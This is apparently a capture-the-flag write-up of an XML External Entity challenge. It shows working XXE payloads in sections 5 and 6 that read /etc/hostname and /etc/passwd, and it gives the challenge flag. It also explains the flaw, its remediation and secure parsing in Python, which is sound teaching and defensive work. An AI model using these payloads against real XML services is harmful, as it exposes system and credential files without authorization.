# SOAP — XML External Entity (XXE)

**Category:** Web Exploitation  
**Difficulty:** Beginner / Intermediate  
**Target:** `chatelaine.cylabacademy.net:18135`  
**Vulnerability:** XML External Entity (XXE)  
**Tools:** Browser DevTools, Burp Suite Repeater, curl  
**Status:** Solved

---

## 1. Challenge Overview

The challenge provided a web application with buttons for viewing details about different records.

The objective was to inspect how the application processed requests, identify the vulnerability in its XML handling, and retrieve the challenge flag.

Rather than guessing payloads immediately, I inspected the frontend JavaScript, examined the HTTP request structure, and tested how the server processed XML entities.

## 2. Reconnaissance

### Step 1 — Inspect the web application

The application displayed records with a **Details** button.

I opened the browser's Developer Tools and inspected the page's HTML, JavaScript, and Network activity.

I discovered JavaScript files named:

- `xmlDetailsCheckPayload.js`
- `detailsCheck.js`

These files helped reveal how the application submitted requests.

### Step 2 — Analyze the JavaScript

The relevant code set the request content type:

```javascript
window.contentType = 'application/xml';
```

The application constructed an XML document from the form data and sent it to the server.

The request was submitted using:

```javascript
fetch(path, {
    method,
    headers: {
        'Content-Type': window.contentType
    },
    body: payload(data)
});
```

The form revealed the endpoint:

```html
<form class="detailForm" action="/data" method="POST">
```

**Important findings:**

| Property | Finding |
|---|---|
| HTTP method | POST |
| Endpoint | `/data` |
| Content type | `application/xml` |
| XML root element | `<data>` |
| User-controlled field | `<ID>` |

This suggested that the server was parsing XML supplied by the client.

**Learning point:** Client-side JavaScript can reveal request formats, endpoints, headers, and parameters. However, the actual server-side implementation must still be tested.

## 3. Establish a Baseline

Before testing for vulnerabilities, I observed a normal request.

### Request body

```xml
<?xml version="1.0" encoding="UTF-8"?>
<data>
    <ID>3</ID>
</data>
```

The server returned information associated with record ID `3`, including:

```text
Special Info:::: Researches on Digital Public goods e.g MOSIP
```

This confirmed that the application accepted XML and used the `ID` field to retrieve record details.

A baseline is important because it lets us compare normal application behavior with the results of security tests.

## 4. Test Internal XML Entity Expansion

### Objective

Determine whether the XML parser processed a custom entity defined in a DTD.

### Test payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY test "XXE_TEST">
]>
<data>
    <ID>&test;</ID>
</data>
```

### Observation

The server returned:

```text
Invalid ID: XXE_TEST
```

### Analysis

The response contained the value `XXE_TEST`, even though the submitted XML used the reference `&test;`.

This indicated that the parser expanded the internal entity.

**What this proves:** Internal entity expansion was occurring.

**What this does not prove yet:** That external entities could be resolved. That requires a separate test.

## 5. Test External Entity Resolution

### Objective

Determine whether the XML parser resolved an entity that referenced a local file.

### Test payload

The following test was performed against the authorized CTF target:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY test SYSTEM "file:///etc/hostname">
]>
<data>
    <ID>&test;</ID>
</data>
```

### Observation

The response contained:

```text
Invalid ID: challenge
```

The value matched the hostname content observed in the challenge environment.

### Analysis

The XML parser appeared to resolve the external entity and substitute the referenced file's content into the `ID` value.

The application then included that value in its error response.

This was evidence of **in-band XML External Entity (XXE)** behavior.

The important clue was not simply that the response said `Invalid ID`. It was that the response contained data originating from the referenced file.

## 6. Retrieve the Flag

After confirming external entity resolution, I tested file disclosure using `/etc/passwd` in the challenge environment.

### Test payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY test SYSTEM "file:///etc/passwd">
]>
<data>
    <ID>&test;</ID>
</data>
```

### Observation

The response included Linux account entries. The final account entry contained the flag:

```text
academy:x:1001:academy{XML_3xtern@l_3nt1t1ty_cf50dd39}
```

### Flag

```text
academy{XML_3xtern@l_3nt1t1ty_cf50dd39}
```

**Result:** Challenge solved.

## 7. Vulnerability Explanation

The vulnerability occurred because the application processed attacker-controlled XML in a way that allowed external entity resolution.

The process can be summarized as follows:

1. The client sends an XML document to `/data`.
2. The server parses the document.
3. The XML document declares an external entity.
4. The parser resolves the entity and reads the referenced resource.
5. The application uses the expanded value in its response.
6. The file contents become visible to the requester.

The application therefore exposed local file contents through its normal HTTP response.

### Attack flow

```text
Attacker
   |
   | POST /data
   | XML containing an external entity
   v
Web Application
   |
   v
XML Parser
   |
   | Resolves external entity
   v
Local File
   |
   | File contents returned to parser
   v
Application Response
   |
   v
Attacker receives file contents
```

## 8. Impact

Depending on the parser configuration, file permissions, and server environment, XXE may lead to:

- Disclosure of local files readable by the application process.
- Exposure of application configuration or secrets.
- Server-side requests to internal or external resources, if network access permits.
- Denial of service in some parser configurations.

This challenge demonstrated local file disclosure. It did not, by itself, demonstrate remote code execution or complete server compromise.

## 9. Remediation

Developers should:

1. Disable DTD processing when it is not required.
2. Disable external general and parameter entities.
3. Disable XInclude if unnecessary.
4. Use a secure XML parser or hardened parser configuration.
5. Keep XML libraries updated.
6. Restrict unnecessary outbound network access.
7. Run the application with least privilege.
8. Validate XML structure and application data.
9. Avoid returning sensitive parser or system information in error messages.

Input validation alone is insufficient. The XML parser itself must be configured securely.

---

# Extra Learning Notes

These topics explain the concepts behind the vulnerability and help build a stronger foundation for future web exploitation challenges.

## 10. XML Fundamentals

XML stands for **Extensible Markup Language**. It represents structured data using elements and attributes.

Example:

```xml
<student id="101">
    <name>Alex</name>
    <course>Information Technology</course>
</student>
```

- `<student>` is the root element.
- `<name>` and `<course>` are child elements.
- `id="101"` is an attribute.
- `Alex` and `Information Technology` are text values.

### XML rules

- Tags must be properly nested.
- Opening and closing tags must match.
- XML is case-sensitive.
- There must be one root element.
- Attribute values must be quoted.

### XML vs. JSON

XML:

```xml
<user>
    <name>Alex</name>
</user>
```

JSON:

```json
{
  "user": {
    "name": "Alex"
  }
}
```

Both can represent structured data, but XML also supports features such as DTDs, entities, and namespaces. Those additional features are relevant to XXE.

## 11. XML Elements, Attributes, and Namespaces

### Elements

Elements represent data or contain other elements.

```xml
<user>
    <email>alex@example.com</email>
</user>
```

### Attributes

Attributes describe an element.

```xml
<user id="101" status="active"/>
```

### Namespaces

Namespaces distinguish XML elements that belong to different vocabularies.

```xml
<root xmlns:shop="https://example.com/shop">
    <shop:item>Keyboard</shop:item>
</root>
```

Here, `shop` is a prefix associated with a namespace URI.

Namespaces help prevent naming conflicts. They are not a security mechanism against XXE.

## 12. DTDs and Entities

A **DTD (Document Type Definition)** can define the structure of an XML document and declare entities.

### Internal entity

```xml
<!DOCTYPE data [
    <!ENTITY message "Hello">
]>
<data>&message;</data>
```

If expansion is permitted, the parser substitutes `Hello` for `&message;`.

### External entity

```xml
<!DOCTYPE data [
    <!ENTITY message SYSTEM "file:///example.txt">
]>
<data>&message;</data>
```

If the parser resolves the external entity, it may attempt to read the referenced file.

The difference is that the internal entity contains a value defined in the document, while the external entity references a resource outside it.

## 13. XML Injection vs. XXE

These terms are related but different.

| XML injection | XXE |
|---|---|
| Untrusted input changes XML structure or meaning | Unsafe external entity processing |
| May alter application behavior | May expose local files or trigger server-side requests |
| Does not necessarily involve entities | Usually involves a DTD and external entity |
| May occur without file access | Can result in file disclosure if conditions permit |

XXE can occur in an application that accepts XML, but accepting XML alone does not make an application vulnerable.

## 14. In-Band vs. Out-of-Band XXE

### In-band XXE

The application returns the resolved content in its normal HTTP response.

```text
Request → Vulnerable application
        → XML parser resolves entity
        → File content appears in response
```

This is what happened in the challenge.

### Out-of-band (OOB) XXE

The parser causes a separate network interaction that can be observed through an authorized monitoring endpoint or server logs.

```text
Request → Vulnerable application
        → XML parser
        → Separate network interaction
        → Authorized monitoring endpoint
```

OOB XXE may be possible even if the application does not return the file contents directly. It depends on parser behavior and available network access.

## 15. SOAP Request Structure

SOAP stands for **Simple Object Access Protocol**. It is a messaging protocol that commonly uses XML.

A simplified SOAP message looks like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope
    xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
    <soap:Body>
        <GetDetails>
            <ID>3</ID>
        </GetDetails>
    </soap:Body>
</soap:Envelope>
```

- `Envelope` is the outer SOAP element.
- `Body` contains the operation and its data.
- `GetDetails` represents an example operation.

**Important challenge observation:** Although the CTF was named SOAP, the request we inspected used a simple `<data>` root element rather than the standard SOAP Envelope structure. The challenge name alone does not establish that the actual request follows the SOAP protocol.

## 16. Secure XML Processing in Python

Python applications should use a parser and configuration appropriate for untrusted XML.

One practical option is `defusedxml`.

Create an isolated environment and install it:

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install defusedxml
```

Example:

```python
from defusedxml import ElementTree
from defusedxml.common import DefusedXmlException

xml_data = b"""
<data>
    <ID>3</ID>
</data>
"""

try:
    root = ElementTree.fromstring(xml_data)

    if root.tag != "data":
        raise ValueError("Unexpected root element")

    record_id = root.findtext("ID")

    if record_id is None or not record_id.isdigit():
        raise ValueError("Invalid ID")

    print("Validated ID:", record_id)

except (DefusedXmlException, ValueError) as error:
    print("Rejected XML:", error)
```

This example demonstrates secure parsing practices and basic input validation. In a real application, also enforce request-size limits, handle malformed input, verify authorization, and ensure that record IDs are checked against the database.

## 17. Evidence-Based CTF Reporting

A good security report separates observations from conclusions.

**Observation:** The response contained `XXE_TEST`.

**Conclusion:** The parser expanded the internal entity.

**Observation:** The response contained content matching `/etc/hostname`.

**Conclusion:** The parser appeared to resolve an external entity and disclose local file content.

**Impact:** An attacker could potentially read files accessible to the application process.

Do not claim remote code execution or complete server compromise unless the evidence supports those claims.

## 17. Lessons Learned

1. Inspect frontend JavaScript to discover how requests are constructed.
2. Use browser DevTools to understand network requests.
3. Establish a baseline before testing unusual inputs.
4. Internal entity expansion and external entity resolution are different tests.
5. A response containing local file content is strong evidence of in-band XXE.
6. A vulnerable parser can expose files available to the application's operating-system account.
7. Use secure XML parser configurations rather than relying on input validation alone.
8. Write conclusions that are directly supported by the evidence.

flag: `academy{XML_3xtern@l_3nt1t1ty_cf50dd39}`